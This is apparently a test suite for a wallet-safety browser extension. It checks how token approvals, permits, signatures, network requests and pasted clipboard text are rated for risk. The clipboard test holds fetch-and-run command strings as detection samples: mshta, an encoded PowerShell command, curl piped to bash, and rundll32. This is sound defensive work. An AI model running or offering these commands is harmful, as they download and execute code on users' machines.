"use strict";
// Wallet-request shape tests. All calldata is built here, nothing is fetched.
const test = require("node:test");
const assert = require("node:assert/strict");
const R = require("../src/rules.js");
const B = require("../src/background.js");

const TOKEN = "0x1111111111111111111111111111111111111111";
const SPENDER = "0x2222222222222222222222222222222222222222";
const USER = "0x3333333333333333333333333333333333333333";
const OTHER = "0x4444444444444444444444444444444444444444";

const word = (hex) => BigInt(hex).toString(16).padStart(64, "0");
const addrWord = (a) => a.slice(2).toLowerCase().padStart(64, "0");
const call = (selector, ...words) => `0x${selector}${words.join("")}`;
const tx = (to, data, extra) => ({ to, data, ...(extra || {}) });
const send = (t) => R.classify("eth_sendTransaction", [t], {});
const HUGE = (1n << 256n) - 1n;

test("unlimited approve is high and says UNLIMITED", () => {
  const v = send(tx(TOKEN, call("095ea7b3", addrWord(SPENDER), word(HUGE))));
  assert.equal(v.code, "approve-unlimited");
  assert.equal(v.level, "high");
  assert.equal(v.f.amount, "UNLIMITED");
  assert.equal(v.f.who, SPENDER);
  assert.equal(v.f.token, TOKEN);
});

test("a bounded approve stays medium and keeps the amount", () => {
  const v = send(tx(TOKEN, call("095ea7b3", addrWord(SPENDER), word(1000))));
  assert.equal(v.code, "approve");
  assert.equal(v.level, "medium");
  assert.equal(v.f.amount, "1000");
});

test("approve at the 2^128 unlimited boundary", () => {
  assert.equal(
    send(tx(TOKEN, call("095ea7b3", addrWord(SPENDER), word(1n << 128n)))).code,
    "approve-unlimited"
  );
  assert.equal(
    send(tx(TOKEN, call("095ea7b3", addrWord(SPENDER), word((1n << 128n) - 1n)))).code,
    "approve"
  );
});

test("setApprovalForAll only matters when the flag is true", () => {
  const on = send(tx(TOKEN, call("a22cb465", addrWord(SPENDER), word(1))));
  assert.equal(on.code, "approval-for-all");
  assert.equal(on.level, "high");
  const off = send(tx(TOKEN, call("a22cb465", addrWord(SPENDER), word(0))));
  assert.equal(off, null);
});

test("increaseAllowance decodes spender and unlimited amount", () => {
  const v = send(tx(TOKEN, call("39509351", addrWord(SPENDER), word(HUGE))));
  assert.equal(v.code, "allowance");
  assert.equal(v.level, "high");
  assert.equal(v.f.unlimited, true);
});

test("Permit2 approve maps token and spender in the right order", () => {
  const v = send(
    tx(
      "0x000000000022d473030f116ddee9f6b43ac78ba3",
      call("87517c45", addrWord(TOKEN), addrWord(SPENDER), word(500), word(1700000000))
    )
  );
  assert.equal(v.code, "permit2-approve");
  assert.equal(v.f.token, TOKEN);
  assert.equal(v.f.who, SPENDER);
  assert.equal(v.f.amount, "500");
});

test("on-chain EIP-2612 permit decodes the spender and value", () => {
  const v = send(
    tx(
      TOKEN,
      call(
        "d505accf",
        addrWord(USER),
        addrWord(SPENDER),
        word(HUGE),
        word(1700000000),
        word(27),
        word(1),
        word(2)
      )
    )
  );
  assert.equal(v.code, "permit-onchain");
  assert.equal(v.f.who, SPENDER);
  assert.equal(v.f.amount, "UNLIMITED");
});

test("transferFrom and safeTransferFrom describe direction", () => {
  const tf = send(tx(TOKEN, call("23b872dd", addrWord(USER), addrWord(OTHER), word(5))));
  assert.equal(tf.code, "transfer-from");
  assert.equal(tf.f.from, USER);
  assert.equal(tf.f.to, OTHER);
  const nft = send(tx(TOKEN, call("42842e0e", addrWord(USER), addrWord(OTHER), word(7))));
  assert.equal(nft.code, "nft-transfer");
  assert.equal(nft.level, "medium");
});

test("a hidden approval inside a multicall is promoted to the worst part", () => {
  const data =
    call("ac9650d8", addrWord(SPENDER), addrWord(word(64n))) +
    call("095ea7b3", addrWord(SPENDER), word(HUGE));
  const v = send(tx(TOKEN, data));
  assert.equal(v.code, "approve-unlimited");
  assert.equal(v.level, "high");
  assert.equal(v.f.selector, "0xac9650d8");
  assert.ok(v.f.count >= 1);
});

test("a plain multicall is medium, not silent", () => {
  const v = send(tx(TOKEN, call("1f0464d1", addrWord(word(1n)))));
  assert.equal(v.code, "multicall");
  assert.equal(v.level, "medium");
});

test("payable calls, deployment and unknown calls", () => {
  assert.equal(send(tx(TOKEN, "", { value: "0xde0b6b3a7640000" })).code, "payable-call");
  assert.equal(send({ to: null, data: "0x" }).code, "create-contract");
  assert.equal(send(tx(TOKEN, "0xdeadbeef")), null);
  assert.equal(R.classify("eth_sendTransaction", [null], {}), null);
});

test("EIP-7702 authorization is high risk", () => {
  const v = send(tx(TOKEN, "0x", { authorizationList: [{ address: OTHER }] }));
  assert.equal(v.code, "eip7702");
  assert.equal(v.level, "high");
  assert.equal(v.f.who, OTHER);
});

test("typed-data permits, orders and delegations", () => {
  const permit = R.classifyTypedData(
    JSON.stringify({
      primaryType: "Permit",
      domain: { name: "USD Coin", chainId: 1, verifyingContract: TOKEN },
      message: { spender: SPENDER, value: String(HUGE), deadline: 1900000000 },
    })
  );
  assert.equal(permit.code, "permit");
  assert.equal(permit.f.amount, "UNLIMITED");
  assert.equal(permit.f.expired, false);

  const permit2 = R.classifyTypedData({
    primaryType: "PermitSingle",
    domain: { name: "Permit2", chainId: 8453 },
    message: { details: { token: TOKEN, amount: "77", spender: SPENDER } },
  });
  assert.equal(permit2.code, "permit2-signature");
  assert.equal(permit2.f.amount, "77");

  const order = R.classifyTypedData({
    primaryType: "OrderComponents",
    domain: { name: "Seaport" },
    message: { offer: [1, 2], consideration: [1] },
  });
  assert.equal(order.code, "market-order");
  assert.equal(order.f.count, 3);

  const delegation = R.classifyTypedData({
    primaryType: "Delegation",
    message: { delegate: OTHER },
  });
  assert.equal(delegation.code, "delegation");
  assert.equal(delegation.f.who, OTHER);

  assert.equal(R.classifyTypedData("{broken"), null);
  assert.equal(R.classifyTypedData({ primaryType: "Mail" }), null);
});

test("personal_sign only wakes up for approval wording or blind hashes", () => {
  assert.equal(R.classifyPersonalSign(["Sign in with Ethereum"]), null);
  assert.equal(R.classifyPersonalSign(["hello there"]), null);
  const approving = R.classifyPersonalSign(["Please approve this spender unlimited"]);
  assert.equal(approving.code, "signature-text");
  const blind = R.classifyPersonalSign(["0x" + "ab".repeat(32), USER]);
  assert.equal(blind.code, "blind-hash");
  const hexText = R.classifyPersonalSign(["0x" + Buffer.from("approve permit").toString("hex")]);
  assert.equal(hexText.code, "signature-text");
});

test("eth_sign is always a blind high-risk signature", () => {
  const v = R.classify("eth_sign", [USER, "0xabc"], {});
  assert.equal(v.code, "eth-sign");
  assert.equal(v.level, "high");
});

test("network and asset requests", () => {
  const add = R.classify(
    "wallet_addEthereumChain",
    [{ chainId: "0x1", chainName: "Ethereum", rpcUrls: ["https://rpc.example/"] }],
    {}
  );
  assert.equal(add.code, "chain-add");
  assert.equal(add.f.chain, "1");
  assert.equal(add.f.origin, "https://rpc.example");
  const sw = R.classify("wallet_switchEthereumChain", [{ chainId: "0x89" }], {});
  assert.equal(sw.code, "chain-switch");
  assert.equal(sw.title.includes("Polygon"), true);
  const watch = R.classify(
    "wallet_watchAsset",
    [{ options: { address: TOKEN, symbol: "FAKE" } }],
    {}
  );
  assert.equal(watch.code, "watch-asset");
  assert.equal(watch.f.token, TOKEN);
  assert.equal(R.classify("wallet_grantPermissions", [{}], {}).code, "grant-permissions");
});

test("wallet_sendCalls batches keep a known renderable code", () => {
  const v = R.classify(
    "wallet_sendCalls",
    [
      {
        calls: [
          tx(TOKEN, call("095ea7b3", addrWord(SPENDER), word(HUGE))),
          { to: OTHER, data: "0x" },
        ],
      },
    ],
    {}
  );
  assert.equal(v.code, "approve-unlimited");
  assert.equal(v.f.count, 2);
  assert.ok(B.TEMPLATES[v.code]);
  const plain = R.classify(
    "wallet_sendCalls",
    [{ calls: [tx(TOKEN, "0xdeadbeef"), tx(OTHER, "0xdeadbeef")] }],
    {}
  );
  assert.equal(plain.code, "batched-call");
  assert.ok(B.TEMPLATES[plain.code]);
});

test("an exposed site prepends its note, and unknown methods stay quiet", () => {
  const v = R.classify(
    "eth_sendTransaction",
    [tx(TOKEN, call("095ea7b3", addrWord(SPENDER), word(1)))],
    { risky: true }
  );
  assert.equal(v.risky, true);
  assert.match(v.reasons[0], /unpatched PHP/);
  assert.equal(R.classify("eth_chainId", [], {}), null);
});

test("clipboard tiers: critical, install, and the quiet middle", () => {
  assert.equal(R.clipboardTier("mshta https://x.example/a.hta"), "critical");
  assert.equal(
    R.clipboardTier("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="),
    "critical"
  );
  assert.equal(R.clipboardTier("curl -fsSL https://x.example/i.sh | bash"), "install");
  assert.equal(R.clipboardTier("just some text"), null);
  assert.equal(R.clipboardTier("short"), null);
  assert.equal(R.clipboardTier("x".repeat(4001)), null);
  assert.equal(R.clipboardTier(null), null);
  assert.equal(R.classifyClipboard("just some text"), null);
  assert.equal(R.classifyClipboard("rundll32 x.dll,Entry").code, "clickfix");
});

test("wallet action matcher is anchored", () => {
  assert.equal(R.WALLET_ACTION.test("eth_sendTransaction"), true);
  assert.equal(R.WALLET_ACTION.test("eth_sendTransactionX"), false);
  assert.equal(R.WALLET_ACTION.test("eth_chainId"), false);
});

test("safeAddr and chainId helpers refuse junk", () => {
  assert.equal(R.safeAddr(TOKEN), `0x1111\u20261111`);
  assert.equal(R.safeAddr("nope"), "an unknown address");
  assert.equal(R.safeName("A B"), "A B");
  assert.equal(R.safeName("<b>"), "an unknown contract");
  assert.equal(R.chainId("0x1"), "1");
  assert.equal(R.chainId(137), "137");
  assert.equal(R.chainId("nope"), "");
});
